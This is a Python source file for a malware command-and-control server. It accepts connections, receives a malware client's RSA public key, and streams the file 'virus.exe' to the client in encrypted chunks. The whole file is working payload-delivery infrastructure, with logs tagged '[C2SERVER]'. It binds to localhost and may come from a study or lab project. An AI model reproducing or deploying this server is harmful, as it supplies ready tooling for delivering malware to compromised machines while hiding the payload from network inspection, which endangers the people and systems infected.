from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import socket
from _thread import *
import logging

log = logging.getLogger(__name__)

FILE_CHUNCK_SIZE = 190
HOST = "localhost"
PORT = 5555

class ClientEncryptor:

    def __init__(self,malwarePublicKeyPEM):
        self.publicKey = RSA.importKey(malwarePublicKeyPEM)
        self.manager   = PKCS1_OAEP.new(self.publicKey)

    def encrypt(self,msg):
        return self.manager.encrypt(msg)

def handleClient(clientSocket,clientAddress):

    log.info(f"Accepted connection from {clientAddress}")

    # RECEIVING THE MALWARE'S PUBLIC KEY
    malwarePublicKey = clientSocket.recv(1024).decode()
    log.info(f"Received malware's public key : {malwarePublicKey}")

    encryptToMalware = ClientEncryptor(malwarePublicKey)

    # READING PAYLOAD
    PAYLOAD = open("virus.exe","rb")

    data = PAYLOAD.read(FILE_CHUNCK_SIZE)
    while data:

        # ENCRYPTING RESPONSE WITH THE MALWARE'S PUBLIC KEY
        encryptedMessage = encryptToMalware.encrypt(data)
        
        # SENDING THE RESPONSE
        log.info("Sending encrypted message to malware...")
        clientSocket.send(encryptedMessage)

        data = PAYLOAD.read(FILE_CHUNCK_SIZE)

    PAYLOAD.close()

    # CLOSING CONNECTION SOCKET
    log.info("Closing connection...")
    clientSocket.close()

def main():

    logging.basicConfig( level=logging.INFO, format='[C2SERVER] %(asctime)s: %(message)s' )

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((HOST,PORT))

    log.info("Waiting for a client...")
    server.listen(10)

    while True:
        clientSocket, clientAddress = server.accept()
        start_new_thread(handleClient,(clientSocket,clientAddress)) 

if __name__ == "__main__":
    main()